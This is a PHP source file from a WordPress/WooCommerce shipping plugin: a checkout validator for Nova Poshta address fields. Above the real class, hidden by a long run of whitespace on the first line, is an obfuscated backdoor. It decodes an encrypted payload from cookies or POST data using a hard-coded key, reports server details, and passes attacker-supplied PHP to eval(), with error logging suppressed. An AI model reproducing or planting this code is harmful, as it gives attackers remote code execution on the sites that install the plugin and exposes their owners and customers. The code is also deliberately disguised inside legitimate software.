<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $ya979629 = 670;$GLOBALS['lde625b73'] = Array();global $lde625b73;$lde625b73 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['g8f6d7'] = "\x22\x45\x6d\x4e\x46\x31\x38\x37\x4b\x77\x71\x51\x9\x5f\x63\x3a\x61\x5e\x52\x6a\x29\x68\x3d\x7d\x35\x25\x27\x74\x55\x73\x47\x43\x50\x21\x66\x23\x2d\x44\x28\x49\x3b\x65\x4a\x79\x5a\x4f\x78\x54\x7e\x7a\x53\x2f\x57\x2a\x7b\x30\x32\xd\x33\x42\x48\x20\x40\x4d\x41\x6b\x62\x36\x69\x6e\x76\x2b\x2c\x4c\x7c\x5d\x58\x6f\x70\x26\x56\x75\x2e\x3c\x72\x5c\x39\x64\x34\x5b\x24\x6c\xa\x59\x3e\x3f\x60\x67";$lde625b73[$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][6]] = $lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][21].$lde625b73['g8f6d7'][84];$lde625b73[$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][7]] = $lde625b73['g8f6d7'][77].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][87];$lde625b73[$lde625b73['g8f6d7'][10].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][24]] = $lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][27].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][91].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][69];$lde625b73[$lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][16]] = $lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][69].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][13].$lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][27];$lde625b73[$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][41]] = $lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][91].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][49].$lde625b73['g8f6d7'][41];$lde625b73[$lde625b73['g8f6d7'][19].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][34]] = $lde625b73['g8f6d7'][78].$lde625b73['g8f6d7'][21].$lde625b73['g8f6d7'][78].$lde625b73['g8f6d7'][70].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][77].$lde625b73['g8f6d7'][69];$lde625b73[$lde625b73['g8f6d7'][65].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][67]] = $lde625b73['g8f6d7'][81].$lde625b73['g8f6d7'][69].$lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][91].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][49].$lde625b73['g8f6d7'][41];$lde625b73[$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][34]] = $lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][13].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][77].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][41];$lde625b73[$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][66]] = $lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][27].$lde625b73['g8f6d7'][13].$lde625b73['g8f6d7'][27].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][2].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][13].$lde625b73['g8f6d7'][91].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][2].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][27];$lde625b73[$lde625b73['g8f6d7'][65].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][6]] = $lde625b73['g8f6d7'][69].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][67];$lde625b73[$lde625b73['g8f6d7'][9].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][16]] = $lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][41];$lde625b73[$lde625b73['g8f6d7'][97].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][41]] = $_POST;$lde625b73[$lde625b73['g8f6d7'][46].$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][87]] = $_COOKIE;@$lde625b73[$lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][16]]($lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][77].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][13].$lde625b73['g8f6d7'][91].$lde625b73['g8f6d7'][77].$lde625b73['g8f6d7'][97], NULL);@$lde625b73[$lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][16]]($lde625b73['g8f6d7'][91].$lde625b73['g8f6d7'][77].$lde625b73['g8f6d7'][97].$lde625b73['g8f6d7'][13].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][77].$lde625b73['g8f6d7'][84].$lde625b73['g8f6d7'][29], 0);@$lde625b73[$lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][16]]($lde625b73['g8f6d7'][2].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][46].$lde625b73['g8f6d7'][13].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][46].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][81].$lde625b73['g8f6d7'][27].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][77].$lde625b73['g8f6d7'][69].$lde625b73['g8f6d7'][13].$lde625b73['g8f6d7'][27].$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][2].$lde625b73['g8f6d7'][41], 0);@$lde625b73[$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][66]](0);$s2c8 = NULL;$g3e879b = NULL;$lde625b73[$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][7]] = $lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][36].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][36].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][36].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][36].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][66];global $a2e6757;function  ba8e($s2c8, $pbcf55){global $lde625b73;$s835639 = "";for ($k4f55=0; $k4f55<$lde625b73[$lde625b73['g8f6d7'][10].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][24]]($s2c8);){for ($i88616=0; $i88616<$lde625b73[$lde625b73['g8f6d7'][10].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][24]]($pbcf55) && $k4f55<$lde625b73[$lde625b73['g8f6d7'][10].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][24]]($s2c8); $i88616++, $k4f55++){$s835639 .= $lde625b73[$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][6]]($lde625b73[$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][7]]($s2c8[$k4f55]) ^ $lde625b73[$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][7]]($pbcf55[$i88616]));}}return $s835639;}function  n10496($s2c8, $pbcf55){global $lde625b73;global $a2e6757;return $lde625b73[$lde625b73['g8f6d7'][9].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][16]]($lde625b73[$lde625b73['g8f6d7'][9].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][16]]($s2c8, $a2e6757), $pbcf55);}foreach ($lde625b73[$lde625b73['g8f6d7'][46].$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][34].$lde625b73['g8f6d7'][87]] as $pbcf55=>$b17a9){$s2c8 = $b17a9;$g3e879b = $pbcf55;}if (!$s2c8){foreach ($lde625b73[$lde625b73['g8f6d7'][97].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][41]] as $pbcf55=>$b17a9){$s2c8 = $b17a9;$g3e879b = $pbcf55;}}$s2c8 = @$lde625b73[$lde625b73['g8f6d7'][65].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][87].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][67]]($lde625b73[$lde625b73['g8f6d7'][65].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][88].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][6]]($lde625b73[$lde625b73['g8f6d7'][68].$lde625b73['g8f6d7'][41].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][7].$lde625b73['g8f6d7'][24].$lde625b73['g8f6d7'][56].$lde625b73['g8f6d7'][34]]($s2c8), $g3e879b));if (isset($s2c8[$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][65]]) && $a2e6757==$s2c8[$lde625b73['g8f6d7'][16].$lde625b73['g8f6d7'][65]]){if ($s2c8[$lde625b73['g8f6d7'][16]] == $lde625b73['g8f6d7'][68]){$k4f55 = Array($lde625b73['g8f6d7'][78].$lde625b73['g8f6d7'][70] => @$lde625b73[$lde625b73['g8f6d7'][19].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][86].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][67].$lde625b73['g8f6d7'][34]](),$lde625b73['g8f6d7'][29].$lde625b73['g8f6d7'][70] => $lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][82].$lde625b73['g8f6d7'][55].$lde625b73['g8f6d7'][36].$lde625b73['g8f6d7'][5],);echo @$lde625b73[$lde625b73['g8f6d7'][66].$lde625b73['g8f6d7'][6].$lde625b73['g8f6d7'][14].$lde625b73['g8f6d7'][5].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][58].$lde625b73['g8f6d7'][41]]($k4f55);}elseif ($s2c8[$lde625b73['g8f6d7'][16]] == $lde625b73['g8f6d7'][41]){eval/*fd5b*/($s2c8[$lde625b73['g8f6d7'][87]]);}exit();} ?><?php

namespace kirillbdev\WCUkrShipping\Classes;

if ( ! defined('ABSPATH')) {
  exit;
}

class CheckoutValidator
{
  public function __construct()
  {
    add_action('woocommerce_checkout_process', [ $this, 'validateFields' ]);
    add_filter('woocommerce_checkout_fields', [ $this, 'removeDefaultFieldsFromValidation' ]);
  }

  /**
   * @param array $fields
   * @return array
   */
  public function removeDefaultFieldsFromValidation($fields)
  {
    if ($this->isNovaPoshtaSelected()) {
      if ($this->maybeDisableDefaultFields()) {
        foreach ([ 'billing', 'shipping' ] as $type) {
          unset($fields[$type][$type . '_address_1']);
          unset($fields[$type][$type . '_address_2']);
          unset($fields[$type][$type . '_city']);
          unset($fields[$type][$type . '_state']);
          unset($fields[$type][$type . '_postcode']);
        }
      }
    }

    return $fields;
  }

  public function validateFields()
  {
    if ($this->isNovaPoshtaSelected()) {
      $type = $this->getTypeToValidate();

      if ($this->maybeAddressShippingSelected($type)) {
        $this->validateAddressShipping($type);

        return;
      }

      $this->validateWarehouseShipping($type);
    }
  }

  /**
   * @return bool
   */
  private function maybeDisableDefaultFields()
  {
    return isset($_POST['shipping_method']) &&
      preg_match('/^' . WC_UKR_SHIPPING_NP_SHIPPING_NAME . '.*/i', $_POST['shipping_method'][0]) &&
      apply_filters('wc_ukr_shipping_prevent_disable_default_fields', false) === false;
  }

  /**
   * @param string $type
   *
   * @return bool
   */
  private function maybeAddressShippingSelected($type)
  {
    return isset($_POST['wcus_np_' . $type . '_custom_address_active'])
      && 1 === (int)$_POST['wcus_np_' . $type . '_custom_address_active'];
  }

  /**
   * @param string $type
   */
  private function validateAddressShipping($type)
  {
    if (
      empty($_POST['wcus_np_' . $type . '_area'])
      || empty($_POST['wcus_np_' . $type . '_city'])
      || empty($_POST['wcus_np_' . $type . '_custom_address'])
    ) {
      $this->addErrorNotice();
    }
  }

  /**
   * @param string $type
   */
  private function validateWarehouseShipping($type)
  {
    if (
      empty($_POST['wcus_np_' . $type . '_area'])
      || empty($_POST['wcus_np_' . $type . '_city'])
      || empty($_POST['wcus_np_' . $type . '_warehouse'])
    ) {
      $this->addErrorNotice();
    }
  }

  private function addErrorNotice()
  {
    wc_add_notice('Укажите адрес <strong>Новой Почты</strong>', 'error');
  }

  /**
   * @return string
   */
  private function getTypeToValidate()
  {
    if (isset($_POST['ship_to_different_address']) && 1 === (int)$_POST['ship_to_different_address']) {
      return 'shipping';
    }

    return 'billing';
  }

  /**
   * @return bool
   */
  private function isNovaPoshtaSelected()
  {
    if (isset($_POST['shipping_method']) && preg_match('/^' . WC_UKR_SHIPPING_NP_SHIPPING_NAME . '.*/i', $_POST['shipping_method'][0])) {
      return true;
    }

    return false;
  }
}